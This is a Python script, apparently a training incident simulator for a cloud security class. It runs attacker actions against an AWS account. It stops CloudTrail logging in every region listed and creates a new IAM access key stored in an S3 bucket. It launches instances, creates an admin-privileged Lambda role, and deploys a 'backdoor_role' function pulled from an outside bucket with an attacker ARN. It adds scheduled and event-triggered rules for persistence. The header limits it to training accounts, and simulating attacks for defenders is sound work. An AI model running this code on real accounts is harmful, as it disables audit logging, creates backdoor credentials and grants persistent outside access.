# This incident simulator is designed for use in the Advanced Cloud Security Practitioner training class
# run by Securosis, LLC for the Cloud Security Alliance

# NEVER RUN THIS ON A PRODUCTION ACCOUNT! IT IS FOR TRAINING ACCOUNTS ONLY!!

# This simulator will use techniques based on real world attacks, but within the terms of service of AWS.
# All attacks are easily reversible and limited to your account.
# The code is deliberately not commented to challenge students more if they find the code during the attack
# Since this should only be used in a training account, run it with full admin privileges or write your own IAM policy

# As part of the simulator, code is downloaded from an S3 bucket maintained by Securosis. If this is a concern
# we recommend you copy out the code and run it from a bucket under your control.

import boto3
import json
import click
import yaml
import time
from botocore.exceptions import ClientError



def disable_cloudtrail(regions):
    try:
        for region in regions:
            print(region)
            cloudtrail = boto3.client('cloudtrail', region_name=region)
            trails = cloudtrail.list_trails()
            for trail in trails['Trails']:
                if trail['HomeRegion'] == region:
                    try:
                        cloudtrail.stop_logging(Name=trail['TrailARN'])
                        print('Cloudtrail stopped: ' + trail['TrailARN'])
                    except ClientError as e:
                        print(e.response)
                        pass
    except:
        pass
def add_access_keys():
    iam = boto3.client('iam', region_name='us-east-1')
    users = iam.list_users()
    for user in users['Users']:
        try:
            key = iam.create_access_key(UserName=user['UserName'])
            body = 'Access Key: ' + key['AccessKey']['AccessKeyId'] + ' Secret key would go here'
            key = key['AccessKey']['AccessKeyId']
            print('Access key created for: ' + user['UserName'])
            s3 = boto3.client('s3', region_name='us-east-1')
            try:
                bucket_name = "cloudtrail-bucket-" + key.lower()
                s3.create_bucket(Bucket=bucket_name)
                s3.put_object(Bucket=bucket_name, Key='log', Body=body)
                print('Access key saved to S3 bucket... exiting loop')
            except ClientError as e:
                print(e.response)
            break
        except ClientError as e:
            print(e.response)

def launch_instances(config):
    for region, ami in config['amis'].items():
        try:
            ec2 = boto3.client('ec2', region_name=region)
            ec2.run_instances(ImageId=ami, InstanceType='t2.micro', MaxCount=1, MinCount=1)
        except ClientError as e:
            print(e.response)

def create_lambda_attacks(config):
    assume_role_policy = {
        "Version": "2008-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Principal": {
                    "Service": [
                        "lambda.amazonaws.com",
                        "events.amazonaws.com"
                    ]
                },
                "Action": [
                    "sts:AssumeRole"
                ]
            }
        ]
        }
    iam = boto3.client('iam', region_name='us-east-1')
    try:
     role = iam.create_role(RoleName='lambda_admin', AssumeRolePolicyDocument=json.dumps(assume_role_policy))
     arn = role['Role']['Arn']
    except ClientError as e:
        if 'EntityAlreadyExists' in str(e):
           role = iam.get_role(RoleName='lambda_admin')
           arn = role['Role']['Arn']
           pass
        pass
    try:
        time.sleep(10)
        iam.attach_role_policy(RoleName='lambda_admin', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        time.sleep(30)
    except ClientError as e:
        print(e.response)
    awslambda = boto3.client('lambda', region_name='us-west-2')
    try:
        attack_arn = config['attack_arn']
        lambda_function = awslambda.create_function(FunctionName='lambda_core', Runtime='python3.6', Role=arn, Handler='backdoor_role.backdoor_role', Environment={'Variables': {'ARN': attack_arn}}, Code={'S3Bucket': 'advanced-cloudsec', 'S3Key': 'backdoor_role.zip'})
        lambda_arn = lambda_function['FunctionArn']
    except ClientError as e:
        if 'Function already exist' in str(e):
            lambda_function = awslambda.get_function(FunctionName='lambda_core')
            lambda_arn = lambda_function['Configuration']['FunctionArn']
    try:
        awslambda.add_permission(FunctionName='lambda_core', Action='lambda:InvokeFunction', StatementId='StatementId', Principal='events.amazonaws.com')
    except ClientError as e:
        print(e.response)
    try:
        awslambda.invoke(FunctionName='lambda_core')
    except ClientError as e:
        print(e.response)


    events = boto3.client('events', region_name='us-west-2')
    try:
        rule = events.put_rule(Name='asg', ScheduleExpression='rate(5 minutes)')
    except ClientError as e:
        print(e.response)
    try:
        target = events.put_targets(Rule='asg', Targets=[{'Id': 'lambda_core', 'Arn': lambda_arn}])
    except ClientError as e:
        print(e.response)

    awslambda = boto3.client('lambda', region_name='us-east-2')
    try:
        ami = config['east_2_ami']
        lambda_function = awslambda.create_function(FunctionName='lambda_core', Runtime='python3.6', Role=arn, Environment={'Variables': {'AMI': ami}}, Handler='launch_instance.launch_instance', Code={'S3Bucket': 'advanced-cloudsec-east', 'S3Key': 'launch_instance.zip'})
        lambda_arn = lambda_function['FunctionArn']
    except ClientError as e:
        if 'Function already exist' in str(e):
            lambda_function = awslambda.get_function(FunctionName='lambda_core')
            lambda_arn = lambda_function['Configuration']['FunctionArn']
    try:
        awslambda.invoke(FunctionName='lambda_core')
    except ClientError as e:
        print(e.response)
    time.sleep(5)
    events = boto3.client('events', region_name='us-east-2')
    pattern = {
        "source": [
            "aws.ec2"
        ],
        "detail-type": [
            "EC2 Instance State-change Notification"
        ],
        "detail": {
            "state": [
                "stopped",
                "terminated"
            ]
        }
    }
    try:
        rule = events.put_rule(Name='asg', EventPattern=json.dumps(pattern))
    except ClientError as e:
        print(e.response)
    try:
        target = events.put_targets(Rule='asg', Targets=[{'Id': 'lambda_core', 'Arn': lambda_arn}])
    except ClientError as e:
        print(e.response)
    try:
        awslambda.add_permission(FunctionName='lambda_core', Action='lambda:InvokeFunction', StatementId='StatementId', Principal='events.amazonaws.com')
    except ClientError as e:
        print(e.response)






if __name__ == "__main__":
   regions = ["us-east-2", "us-east-1", "us-west-1", "us-west-2", "ca-central-1", "ap-south-1", "ap-northeast-2", "ap-southeast-1", "ap-southeast-2", "ap-northeast-1", "eu-central-1", "eu-west-1", "eu-west-2", "sa-east-1"]
   file = open('./config.yml', 'r')
   config = file.read()
   config = yaml.safe_load(config)
   disable_cloudtrail(regions)
   add_access_keys()
   launch_instances(config)
   create_lambda_attacks(config)